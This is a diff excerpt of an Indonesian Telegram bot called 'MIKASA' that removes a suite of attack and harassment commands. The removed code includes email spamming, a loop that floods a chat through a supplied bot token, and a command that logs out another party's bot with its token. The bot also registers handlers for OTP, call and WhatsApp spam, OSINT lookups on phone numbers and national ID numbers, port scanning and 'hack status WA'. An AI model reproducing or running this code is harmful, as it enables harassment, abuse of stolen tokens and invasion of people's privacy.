-    await update.message.reply_text(format_loading(f"Mengirim Spam Email ke {target_email}"))
-    
-    try:
-        success, total = run_spam_gmail(target_email, custom_message)
-        
-        if custom_message:
-            msg_preview = custom_message[:50] + ("..." if len(custom_message) > 50 else "")
-            await update.message.reply_text(
-                format_success(
-                    "𝐒𝐏𝐀𝐌 𝐄𝐌𝐀𝐈𝐋 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    f"📧 Target: `{target_email}`\n"
-                    f"✅ Berhasil: {success}/{total} sender\n"
-                    f"📝 Pesan: {msg_preview}"
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await update.message.reply_text(
-                format_success(
-                    "𝐒𝐏𝐀𝐌 𝐄𝐌𝐀𝐈𝐋 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    f"📧 Target: `{target_email}`\n"
-                    f"✅ Berhasil: {success}/{total} sender"
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_cek_dataguru(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐆𝐔𝐑𝐔\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/cekdataguru 1234567890123456"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    keyword = args[0].strip()
-    await update.message.reply_text(format_loading("Mencari Data Guru"))
-    
-    try:
-        data = tool_cek_gtk(keyword)
-        if data:
-            await update.message.reply_text(
-                format_success(
-                    "𝐃𝐀𝐓𝐀 𝐆𝐔𝐑𝐔 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    f"👤 Nama: {data.get('nama', 'N/A')}\n"
-                    f"📮 NUPTK: {data.get('nuptk', 'N/A')}\n"
-                    f"🏫 Sekolah: {data.get('sekolah', {}).get('nama', 'N/A')}\n"
-                    f"📍 Provinsi: {data.get('sekolah', {}).get('m_propinsi', {}).get('keterangan', 'N/A')}"
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await update.message.reply_text(f"❌ Data tidak ditemukan untuk `{keyword}`")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_spam_bottele(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args or len(args) < 3:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐁𝐎𝐓 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌\n"
-                f"𝙁𝙤𝙧𝙢𝙖𝙩:\n"
-                f"/spambottele token idchat pesan"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    token = args[0].strip()
-    chat_id = args[1].strip()
-    pesan = ' '.join(args[2:])
-    
-    await update.message.reply_text(format_loading("Mengirim Spam Bot Telegram"))
-    
-    try:
-        success = 0
-        for i in range(10):
-            url = f"https://api.telegram.org/bot{token}/sendMessage"
-            payload = {"chat_id": chat_id, "text": pesan}
-            resp = requests.post(url, data=payload, timeout=10)
-            if resp.status_code == 200:
-                success += 1
-            time.sleep(0.5)
-        
-        await update.message.reply_text(
-            format_success(
-                "𝐒𝐏𝐀𝐌 𝐁𝐎𝐓 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                f"✅ Berhasil: {success}/10\n"
-                f"📌 Chat ID: `{chat_id}`"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_cek_imei(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐈𝐌𝐄𝐈\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/cekimei 353911112345678"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    imei = args[0].strip()
-    if not imei.isdigit() or len(imei) < 14 or len(imei) > 17:
-        await update.message.reply_text("❌ IMEI harus 14-17 digit!")
-        return
-    
-    await update.message.reply_text(format_loading("Mengecek IMEI"))
-    
-    try:
-        data = tool_cek_imei(imei)
-        if data:
-            await update.message.reply_text(
-                format_success(
-                    "𝐈𝐌𝐄𝐈 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    f"📌 IMEI: `{imei}`\n"
-                    f"📱 Model: {data.get('Item1', 'N/A')}\n"
-                    f"🏷️ Brand: {data.get('Item3', 'N/A')}"
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await update.message.reply_text(f"❌ IMEI `{imei}` tidak ditemukan")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_cek_phising(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐋𝐈𝐍𝐊 𝐏𝐇𝐈𝐒𝐈𝐍𝐆\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/cekphising https://example.com"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    url = args[0].strip()
-    if not url.startswith('http'):
-        url = 'https://' + url
-    
-    await update.message.reply_text(format_loading("Mengecek URL Phising"))
-    
-    try:
-        data = tool_web_phising_checker(url)
-        if data:
-            status = "⚠️ Terdeteksi PHISING!" if data.get('is_phishing') else "✅ Aman"
-            await update.message.reply_text(
-                format_success(
-                    "𝐂𝐄𝐊 𝐋𝐈𝐍𝐊 𝐏𝐇𝐈𝐒𝐈𝐍𝐆 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    f"🔗 URL: {url[:60]}...\n"
-                    f"📌 Status: {status}\n"
-                    f"🛡️ Malware: {'⚠️ Terdeteksi' if data.get('contains_malware') else '✅ Aman'}"
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await update.message.reply_text("❌ Gagal mengecek URL")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_web_recon(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐖𝐄𝐁 𝐑𝐄𝐂𝐎𝐍𝐍𝐀𝐈𝐒𝐒𝐀𝐍𝐂𝐄\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/webrecon google.com"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    domain = args[0].strip().replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
-    await update.message.reply_text(format_loading("Melakukan Web Reconnaissance"))
-    
-    try:
-        data = tool_web_recon(domain)
-        if data:
-            await update.message.reply_text(
-                format_success(
-                    "𝐖𝐄𝐁 𝐑𝐄𝐂𝐎𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    f"🌍 Domain: `{data['domain']}`\n"
-                    f"📌 IP: `{data['ip']}`\n"
-                    f"🔍 Subdomain: {data['total_subs']} ditemukan\n"
-                    f"🔌 Port terbuka: {', '.join(map(str, data['open_ports'])) if data['open_ports'] else 'Tidak ada'}\n\n"
-                    f"📋 *Subdomain sample:*\n" + "\n".join(data['subdomains'][:10]) if data['subdomains'] else "Tidak ada subdomain"
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await update.message.reply_text(f"❌ Gagal reconnaissance untuk `{domain}`")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_lapor_bug(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    await update.message.reply_photo(
-        photo=IMAGE,
-        caption=(
-            f"𝙏𝙊𝙊𝙇𝙎: 𝐋𝐀𝐏𝐎𝐑 𝐁𝐔𝐆\n"
-            f"𝘿𝙀𝙑𝙀𝙇𝙊𝙋: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
-            f"𝙇𝙖𝙥𝙤𝙧𝙠𝙖𝙣 𝙗𝙪𝙜 𝙠𝙚 𝙖𝙙𝙢𝙞𝙣:\n"
-            f"https://wa.me/+6283832110509"
-        ),
-        parse_mode=ParseMode.MARKDOWN
-    )
-
-   async def cmd_foto_tourl(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    await update.message.reply_photo(
-        photo=IMAGE,
-        caption=(
-            f"𝙏𝙊𝙊𝙇𝙎: 𝐅𝐎𝐓𝐎/𝐕𝐈𝐃𝐄𝐎 𝐓𝐎 𝐔𝐑𝐋\n"
-            f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-            f"Kirim file foto/video (max 200MB)"
-        ),
-        parse_mode=ParseMode.MARKDOWN
-    )
-    context.user_data['state'] = 'upload_photo'
-
-   async def cmd_file_tourl(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    await update.message.reply_photo(
-        photo=IMAGE,
-        caption=(
-            f"𝙏𝙊𝙊𝙇𝙎: 𝐅𝐈𝐋𝐄 𝐓𝐎 𝐔𝐑𝐋\n"
-            f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-            f"Kirim file (max 10GB)"
-        ),
-        parse_mode=ParseMode.MARKDOWN
-    )
-    context.user_data['state'] = 'upload_file'
-
-   async def cmd_kill_bottele(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐊𝐈𝐋𝐋 𝐁𝐎𝐓 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/killbottele 1234567890:ABCdef"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    token = args[0].strip()
-    await update.message.reply_text(format_loading("Membunuh Bot Telegram"))
-    
-    try:
-        url = f'https://api.telegram.org/bot{token}/logOut'
-        resp = requests.get(url, timeout=10)
-        if resp.status_code == 200:
-            data = resp.json()
-            if data.get('ok'):
-                await update.message.reply_text(
-                    format_success(
-                        "𝐊𝐈𝐋𝐋 𝐁𝐎𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                        f"✅ Bot berhasil dimatikan!"
-                    ),
-                    parse_mode=ParseMode.MARKDOWN
-                )
-            else:
-                await update.message.reply_text("❌ Token bot tidak valid")
-        else:
-            await update.message.reply_text("❌ Gagal mematikan bot")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_cek_infobot(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/cekinfobot 1234567890:ABCdef"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    token = args[0].strip()
-    await update.message.reply_text(format_loading("Mengambil Info Bot"))
-    
-    try:
-        url = f'https://api.telegram.org/bot{token}/getMe'
-        resp = requests.get(url, timeout=10)
-        if resp.status_code == 200:
-            data = resp.json()
-            if data.get('ok'):
-                result = data.get('result', {})
-                await update.message.reply_text(
-                    format_success(
-                        "𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                        f"🆔 ID: `{result.get('id', 'N/A')}`\n"
-                        f"👤 Nama: {result.get('first_name', 'N/A')}\n"
-                        f"🔗 Username: @{result.get('username', 'N/A')}"
-                    ),
-                    parse_mode=ParseMode.MARKDOWN
-                )
-            else:
-                await update.message.reply_text("❌ Token bot tidak valid")
-        else:
-            await update.message.reply_text("❌ Gagal mengambil info bot")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_shortener_url(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐋𝐈𝐍𝐊 𝐒𝐇𝐎𝐑𝐓𝐄𝐍𝐄𝐑\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/shortenerurl https://www.tokopedia.com"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    url = args[0].strip()
-    if not url.startswith('http'):
-        url = 'https://' + url
-    
-    await update.message.reply_text(format_loading("Memendekkan URL"))
-    
-    try:
-        result = tool_link_shortener(url)
-        if result:
-            await update.message.reply_text(
-                format_success(
-                    "𝐋𝐈𝐍𝐊 𝐒𝐇𝐎𝐑𝐓𝐄𝐍𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    f"🔗 URL Pendek: {result}\n"
-                    f"📎 URL Asli: {url[:60]}..."
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await update.message.reply_text("❌ Gagal memendekkan URL")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_hack_status_wa(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    await update.message.reply_photo(
-        photo=IMAGE,
-        caption=(
-            f"𝙏𝙊𝙊𝙇𝙎: 𝐇𝐀𝐂𝐊 𝐒𝐓𝐀𝐓𝐔𝐒 𝐖𝐀\n"
-            f"𝘿𝙀𝙑𝙀𝙇𝙊𝙋: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
-            f"𝙋𝙖𝙨𝙩𝙞𝙠𝙖𝙣 𝙒𝙝𝙖𝙩𝙨𝘼𝙥𝙥 𝙩𝙚𝙧𝙞𝙣𝙨𝙩𝙖𝙡𝙡\n"
-            f"𝙙𝙖𝙣 𝙨𝙪𝙙𝙖𝙝 𝙢𝙚𝙢𝙗𝙪𝙠𝙖 𝙨𝙩𝙖𝙩𝙪𝙨.\n\n"
-            f"𝙃𝙖𝙨𝙞𝙡 𝙖𝙠𝙖𝙣 𝙙𝙞𝙨𝙞𝙢𝙥𝙖𝙣 𝙙𝙞 𝙛𝙤𝙡𝙙𝙚𝙧 Status_WA"
-        ),
-        parse_mode=ParseMode.MARKDOWN
-    )
-
-   async def cmd_cek_resi(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args or len(args) < 2:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐑𝐄𝐒𝐈\n"
-                f"𝙁𝙤𝙧𝙢𝙖𝙩:\n"
-                f"/cekresi kurir nomorresi\n\n"
-                f"Kurir: jne, jnt, sicepat, anteraja, pos, tiki, shopee\n"
-                f"Contoh: /cekresi jne 1234567890"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    courier = args[0].strip().lower()
-    awb = args[1].strip()
-    
-    await update.message.reply_text(format_loading("Mencari Resi"))
-    
-    try:
-        data = tool_cek_resi(courier, awb)
-        if data:
-            history = data.get('history', [])
-            history_text = ""
-            for h in history[-5:]:
-                history_text += f"📅 {h.get('date', '')} → {h.get('desc', '')}\n"
-            
-            await update.message.reply_text(
-                format_success(
-                    "𝐂𝐄𝐊 𝐑𝐄𝐒𝐈 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                    f"📮 Resi: `{data.get('awb', 'N/A')}`\n"
-                    f"📦 Kurir: {data.get('courier', 'N/A').upper()}\n"
-                    f"📌 Status: {data.get('status', 'N/A')}\n\n"
-                    f"📋 *Riwayat:*\n{history_text or 'Belum ada riwayat'}"
-                ),
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await update.message.reply_text(f"❌ Resi `{awb}` tidak ditemukan")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-
-   async def cmd_get_id_chat(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    if not self.is_verified(user_id):
-        await update.message.reply_text("❌ *Akses Ditolak!*")
-        return
-    
-    args = context.args
-    if not args:
-        await update.message.reply_photo(
-            photo=IMAGE,
-            caption=(
-                f"𝙏𝙊𝙊𝙇𝙎: 𝐆𝐄𝐓 𝐈𝐃 𝐂𝐇𝐀𝐓\n"
-                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
-                f"/getidchatbot 1234567890:ABCdef"
-            ),
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    token = args[0].strip()
-    await update.message.reply_text(format_loading("Mengambil ID Chat Bot"))
-    
-    try:
-        url = f'https://api.telegram.org/bot{token}/getMe'
-        resp = requests.get(url, timeout=10)
-        if resp.status_code == 200:
-            data = resp.json()
-            if data.get('ok'):
-                result = data.get('result', {})
-                await update.message.reply_text(
-                    format_success(
-                        "𝐆𝐄𝐓 𝐈𝐃 𝐂𝐇𝐀𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
-                        f"🆔 Bot ID: `{result.get('id', 'N/A')}`\n"
-                        f"👤 Nama: {result.get('first_name', 'N/A')}\n"
-                        f"🔗 Username: @{result.get('username', 'N/A')}"
-                    ),
-                    parse_mode=ParseMode.MARKDOWN
-                )
-            else:
-                await update.message.reply_text("❌ Token bot tidak valid")
-        else:
-            await update.message.reply_text("❌ Gagal mengambil ID bot")
-    except Exception as e:
-        await update.message.reply_text(format_error(str(e)))
-    
-   async def main(self):
-        print(f"{G}✅ Bot MIKASA Started!{N}")
-        print(f"{G}📱 Bot running{N}")
-        print(f"{W}🔗 Use /start in Telegram{N}")
-        print(f"{Y}📌 Total users: {len(self.users)}{N}")
-        
-        self.app = Application.builder().token(self.token).build()
-        
-        self.app.add_handler(CommandHandler("start", self.start))
-        self.app.add_handler(CommandHandler("register", self.register))
-        self.app.add_handler(CommandHandler("verify", self.verify))
-        
-        self.app.add_handler(CommandHandler("spamotp", self.cmd_spam_otp))
-        self.app.add_handler(CommandHandler("spamcall", self.cmd_spam_call))
-        self.app.add_handler(CommandHandler("spampair", self.cmd_spam_pair))
-        self.app.add_handler(CommandHandler("spamrepwa", self.cmd_spam_repwa))
-        self.app.add_handler(CommandHandler("spamngl", self.cmd_spam_ngl))
-        self.app.add_handler(CommandHandler("osint", self.cmd_osint))
-        self.app.add_handler(CommandHandler("osintnomor", self.cmd_osint_nomor))
-        self.app.add_handler(CommandHandler("osintusername", self.cmd_osint_username))
-        self.app.add_handler(CommandHandler("osintip", self.cmd_osint_ip))
-        self.app.add_handler(CommandHandler("osintdomain", self.cmd_osint_domain))
-        self.app.add_handler(CommandHandler("iptracker", self.cmd_ip_tracker))
-        self.app.add_handler(CommandHandler("portscan", self.cmd_port_scan))
-        self.app.add_handler(CommandHandler("nikparse", self.cmd_nik_parse))
-        self.app.add_handler(CommandHandler("cekkodepos", self.cmd_cek_kodepos))
-        self.app.add_handler(CommandHandler("ceknpsn", self.cmd_cek_npsn))
-        self.app.add_handler(CommandHandler("ffuid", self.cmd_ff_uid))
-        self.app.add_handler(CommandHandler("cekroblox", self.cmd_cek_roblox))
-        self.app.add_handler(CommandHandler("spamgmail", self.cmd_spam_gmail))
-        self.app.add_handler(CommandHandler("cekdataguru", self.cmd_cek_dataguru))
-        self.app.add_handler(CommandHandler("spambottele", self.cmd_spam_bottele))
-        self.app.add_handler(CommandHandler("cekimei", self.cmd_cek_imei))
-        self.app.add_handler(CommandHandler("cekphising", self.cmd_cek_phising))
-        self.app.add_handler(CommandHandler("webrecon", self.cmd_web_recon))
-        self.app.add_handler(CommandHandler("laporbug", self.cmd_lapor_bug))
-        self.app.add_handler(CommandHandler("fototourl", self.cmd_foto_tourl))
-        self.app.add_handler(CommandHandler("filetourl", self.cmd_file_tourl))
-        self.app.add_handler(CommandHandler("killbottele", self.cmd_kill_bottele))
-        self.app.add_handler(CommandHandler("cekinfobot", self.cmd_cek_infobot))
-        self.app.add_handler(CommandHandler("shortenerurl", self.cmd_shortener_url))
-        self.app.add_handler(CommandHandler("hackstatuswa", self.cmd_hack_status_wa))
-        self.app.add_handler(CommandHandler("cekresi", self.cmd_cek_resi))
-        self.app.add_handler(CommandHandler("getidchatbot", self.cmd_get_id_chat))
-        self.app.add_handler(CallbackQueryHandler(self.button_callback))
-        self.app.add_handler(MessageHandler(filters.Document.ALL | filters.PHOTO | filters.VIDEO, self.handle_document))
-        
-        print(f"{G}✅ Bot is running... Press Ctrl+C to stop{N}")
-        
-        await self.app.initialize()
-        await self.app.start()
-        await self.app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
-        
-        try:
-            while True:
-                await asyncio.sleep(1)
-        except KeyboardInterrupt:
-            print(f"\n{Y}⏹️ Stopping bot...{N}")
-            await self.app.updater.stop()
-            await self.app.stop()
-            await self.app.shutdown()
-            
-if __name__ == "__main__":
-    try:
-        bot = MikasaBot(BOT_TOKEN)
-        asyncio.run(bot.main())
-    except KeyboardInterrupt:
-        print(f"\n{R}❌ Bot stopped!{N}")
-        sys.exit(0)
-    except Exception as e:
-        print(f"{R}❌ Error: {e}{N}")
-        sys.exit(1)
+        query.message.delete()
